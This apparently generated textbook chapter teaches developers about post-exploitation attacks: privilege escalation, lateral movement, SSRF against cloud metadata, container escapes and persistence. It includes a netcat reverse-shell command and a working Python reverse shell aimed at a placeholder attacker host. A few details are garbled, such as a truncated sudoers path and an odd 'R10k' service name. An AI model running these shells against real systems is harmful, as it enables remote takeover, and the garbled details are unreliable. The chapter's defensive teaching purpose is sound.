---
chapter: 6
title: "Server, Network, and Infrastructure Attacks"
generated_at: "2026-06-10T15:44:00.705445+00:00"
---

# Chapter 6: Server, Network, and Infrastructure Attacks

## 1. Introduction: The Blast Radius

For many developers, the journey of securing an application ends at the edge of the web server’s HTTP response. There is a common psychological comfort in believing that if you have patched your Cross-Site Scripting (XSS) vulnerabilities, sanitized inputs against SQL Injection, and implemented robust CSRF tokens, your "application" is secure. 

However, this perspective overlooks a critical reality: your application does not exist in a vacuum. It lives on hardware, inside an operating system, within a network, and—more commonly today—inside a complex cloud infrastructure provider's environment.

The moment of realization for many developers occurs during the transition from "Application Layer" exploitation to "System/Network Layer" intrusion. This is known as the **blast radius**. When an attacker successfully exploits a Remote Code Execution (RCE) vulnerability in your web application, they aren't just stealing a single user’s session cookie; they are gaining a foothold on the underlying server. From that point forward, the rules of engagement change completely. The attacker no longer cares about your front-end logic; they care about what other systems can "see" from their current position, what privileges they hold over the local filesystem, and whether they can pivot into neighboring servers or administrative cloud consoles.

This transition is vital for developers to understand because a single oversight in a middleware configuration or an overly permissive Docker container doesn't just compromise one feature—it provides a gateway to your entire organization’s infrastructure. Consider "SolarWinds"-style attacks, where initial access was used as a springboard for massive lateral movement across corporate networks. In such scenarios, the web application is merely the door; once the intruder walks through it, they begin looking for ways to establish **persistence**—moving from temporary, volatile access to what security professionals call "living off the land." This means using built-in system tools and legitimate administrative credentials to remain hidden in your environment even after you patch the original bug that let them in. To defend against this, developers must move beyond application security into infrastructure hardening.

## 2. Linux Privilege Escalation: Climbing the Ladder

When an attacker gains a foothold on a Linux server via a web exploit (such as exploiting a vulnerable PHP script or a misconfigured Nginx module), they typically land in a restricted environment. They are often logged in as a low-privileged user, such as `www-data` or `apache`. In this state, the attacker can see your application's files but cannot modify system configurations, install software at will, or access other users' data. 

For an attacker, however, landing on the server is just Step One. The ultimate goal is **Privilege Escalation**: gaining "root" (administrative) privileges to take full control of the machine.

One common avenue for escalation involves **SUID (Set User ID)** and **SGID (Set Group ID)** binaries. These are files that, when executed, run with the permissions of the owner rather than the user running them. While necessary for certain system functions—such as allowing a normal user to change their password via `passwd`—they become dangerous if misconfigured or poorly designed. If an attacker finds a binary with the SUID bit set that can be manipulated into executing shell commands, they can instantly jump from a low-privileged account to root status. Developers and system administrators can audit for these risks by searching the filesystem:
`find / -perm -4000`

Identifying which of these are necessary is critical; any binary that isn't required but carries this permission should be stripped or moved into a restricted area.

Beyond file permissions, **Sudoers misconfigurations** provide another frequent ladder to root. The `/etc/sudo_` configuration defines what commands a user can run with elevated privileges. A common mistake in development environments—often driven by the need for convenience during deployment—is granting broad sudo rights for specific binaries that have escaped their intended scope. For example, if you allow `www-data` to run `find`, `vim`, or `less` as root (perhaps to "fix" files on the fly), an attacker can use these tools to break out of their restricted shell. 

A vital resource in this space is **GTFOBins**. GTFOBins serves as a comprehensive "cheat sheet," documenting how standard Unix binaries (like `nano`, `python`, or `awk`) can be abused to bypass local security restrictions when granted through sudo permissions. If it’s on the list, an attacker knows exactly which flags to use to gain their root shell.

Furthermore, **cron jobs**—the "heartbeat" of system automation—can be exploited if they are poorly guarded. If a script is executed by the system every minute but that script is stored in a world-writable directory or has insecure permissions, an attacker can replace it with malicious code. Because the cron daemon runs as root to perform its tasks, any script you "replace" will then run as root, granting the attacker full control of the machine.

In modern environments, manual checks for these issues are time-consuming and prone to human error. This is where automated enumeration tools like **Linpeas** or **LinEnum** become essential. These scripts automatically scan a system for thousands of potential misconfigurations—including world-writable files, outdated kernel versions (vulnerable to local exploits), and weak permissions on sensitive files like `/etc/passwd`. By using these tools during the staging phase of development, teams can identify "low-hanging fruit" that would otherwise allow an attacker to escalate their privileges immediately after a successful web exploit.

*Once an attacker has root or elevated access on your server, they no longer care about your SQL injection filters; they now have "the keys" to explore the environment around them.*

## 3. Network Attacks & Lateral Movement

In many traditional security models, developers were taught that a firewall was sufficient: if it's inside the network, it’s safe from the public internet. This chapter challenges that notion. Once an attacker gains access to one server (your web app), they are "inside" your house. From this vantage point, they begin looking for other doors—a process known as **lateral movement**. They may look for internal databases, management consoles, or even neighboring servers in a local network or Virtual Private Cloud (VPC).

One of the primary methods used to move laterally is **ARP Spoofing** and its resulting Man-in-the-Middle (MITM) attacks. Address Resolution Protocol (ARP) tells your computer which physical hardware address corresponds to an IP address on your local network. In a classic ARP spoof, an attacker sends fake messages onto the LAN that associate their MAC address with the IP of another machine—for example, the default gateway or a database server. This causes traffic intended for those machines to flow through the attacker's computer first. By doing this, they can intercept sensitive data (like unencrypted internal credentials) and even modify packets in transit. The core takeaway here is that "internal" networks are not inherently safe; any device on your local network should be treated as potentially compromised if it shares a common segment with a public-facing server.

Another critical risk involves **DNS Poisoning**. In modern infrastructure, services often find each other using internal DNS records (e.g., `db_prod.internal`). If an attacker can manipulate these records or poison the cache of your local DNS resolver, they can redirect traffic meant for one service to a machine they control. This could be used to steal credentials when a developer tries to log into a "private" admin dashboard that is only accessible from within the corporate network.

Finally, attackers use basic networking tools like `nmap` and `nc` (Netcat) to perform **Network Mapping**. From their initial foothold on your web server, they will run scans against internal IP ranges. They aren't just looking for what you *show* them; they are trying to find everything that is "listening." For instance, while your database might be blocked from the public internet by a firewall, it may still listen openly to any request coming from within its own VPC or local subnet. By mapping out these services, an attacker can identify internal tools—like Jenkins servers, internal wikis, or configuration management nodes—that were never intended for public exposure but are now reachable because they share the same "inner" network as your compromised web application.

*In modern environments, "local" networks are often virtualized cloud VPCs where misconfigurations can expose infrastructure-level secrets.*

## 4. Cloud Infrastructure & Container Escapes

For most developers today, "the server" is an instance in AWS, GCP, or Azure running inside a Docker container. This introduces specific risks that differ from traditional on-premise servers but are arguably more dangerous due to the scale at which cloud resources operate.

One of the most critical vulnerabilities in modern cloud environments involves **Cloud Metadata Services (IMDS)**. Cloud providers offer an internal IP address—specifically `169.254.169.254`—that provides metadata about the instance running on it, including its role and temporary security credentials. If your web application has a Server-Side Request Forgery (SSRF) vulnerability, an attacker can "force" your server to make a request to this internal IP. By doing so, they can steal IAM roles or service account keys belonging to that specific instance. These are the difference between having access to one website and having permission to access all S3 buckets in your entire cloud organization. 

It is vital for developers to know the distinction between **IMDSv1** (which allows simple GET requests and is highly susceptible to SSRF) and **IMDSv2**, which requires a session-oriented token, significantly mitigating this risk by requiring an extra step of authentication that most basic web exploits cannot perform automatically.

Even if your server's metadata is secure, the permissions assigned to it might not be. This leads to the danger of **Overprivileged IAM Roles**. Often, during development, engineers assign a "God Mode" role (like `AdministratorAccess` or similar) to an EC2 instance just so they don’t have to deal with permission errors while setting up services. If your web app is compromised and simply runs under such a broad identity, the attacker can immediately begin interacting with other cloud resources—creating new users, spinning up massive mining rigs on your account, or deleting entire databases. The principle of Least Privilege must be applied not just to your application's code permissions, but to its infrastructure-level credentials.

Furthermore, **S3 Buckets and Cloud Storage** remain a primary target for data exfiltration due to misconfigurations. It is common for developers to accidentally leave "Public Read" access on buckets containing logs or database backups. Because these assets are often managed by different tools than the web application itself, they can be overlooked during standard security audits of the code base.

Finally, we must address **Container Escapes**. Containers provide a layer of isolation using Linux namespaces and cgroups to "box in" an application. However, this box is not always unbreakable. If you run a container with the `--privileged` flag or share certain host filesystems (like `/proc`), an attacker who gains root access inside the container can break out into the actual underlying host machine. Once they escape the container and land on the physical/virtual host, they are no longer confined by Docker's isolation; they have reached the "bare metal" of your infrastructure where they may be able to see every other container running on that same hardware.

*Once infrastructure is compromised, the goal shifts toward staying hidden and ensuring that access can be maintained even if the original web exploit is patched.*

## 5. Post-Exploitation: Persistence & Tools

When an attacker moves through these layers, their ultimate priority—besides stealing data—is **Persistence**. They want to ensure they don't lose access just because you find and patch a bug in your code. If they have established multiple ways into the system, patching one "hole" won't kick them out of the house.

One common method for maintaining this connection is through different types of shells. A **Bind Shell** is when an attacker opens a port on the target machine (e.g., listening on port 4444) and waits for you to connect. This is rarely successful in modern environments because firewalls usually block unsolicited incoming connections from the internet. Instead, attackers use **Reverse Shells**. In this scenario, your server initiates an *outbound* connection to a machine controlled by the attacker (e.g., `nc -e /bin/bash [attacker_ip] 4444`). Because most firewalls are configured to allow outgoing traffic from servers, these shells successfully bypass many common security layers. A simple Python-based reverse shell can be written in seconds:

```python
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker_ip",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

By running this, the attacker gains a persistent interactive terminal that bypasses your firewall's inbound rules.

Another method of persistence is **SSH Key Theft**. If an attacker manages to gain root access or even just local user access on a server, they will immediately look for hidden keys in `.ssh/id_rsa` or other directories. They can then add their own public key to the `authorized_keys` file. This gives them "legal" entry into your system via SSH at any time. Even if you find and patch the vulnerability that allowed them to enter through a web port, they still have an active way back in through standard management ports.

To manage these complex tasks, attackers use professional tools like the **Metasploit Framework (MSF)**. Metasploit is not just a "magic button" for hacking; it is a modular platform that allows them to automate and manage their operations. It can be used to automatically scan your network, exploit known vulnerabilities in common services (like SSH or R10k), and provide an organized way to handle multiple simultaneous connections ("sessions"). Instead of manually managing five different shells for three different servers, Metasploit allows them to switch between sessions seamlessly while deploying post-exploitation modules that automatically add their keys, set up persistence scripts, or scan the internal network.

## Conclusion: Hardening the Infrastructure

The shift from "application security" to "infrastructure hardening" is perhaps the most important mental leap a developer can make in today's cloud-centric world. Security is not an isolated layer; it is a stack of nested protections. If your web application is perfectly secure but sits on top of a server with SUID misconfigurations, an overprivileged IAM role, and no metadata protection, then the "security" you built for your users only exists until someone finds one tiny crack in any level beneath yours.

To protect against these threats, developers must adopt a defense-in-depth mindset:
1.  **Use IMDSv2:** Ensure your cloud instances require session tokens to access metadata, preventing simple SSRF attacks from leaking credentials.
2.  **Enforce Least Privilege:** Grant only the specific permissions required for an IAM role or service account; never use "Admin" if a "Read-Only" or specialized scope will suffice.
3.  **Hardened Images:** Use minimal base images (like Alpine) and scan your Docker containers regularly to ensure they don't contain unnecessary binaries that can be used as tools by an attacker.
4.  **Network Isolation:** Never trust the internal network; use firewalls, security groups, and private subnets to segment high-value assets like databases from public-facing web servers.

By securing every layer—from your code’s input sanitization to the cloud provider's configuration—you ensure that even if one door is breached, there are ten more locked doors behind it. Security isn't just about making sure you don't get hacked; it's about ensuring that when a breach occurs at any point in the chain, the "blast radius" remains small enough to contain and neutralize before it becomes an organizational catastrophe.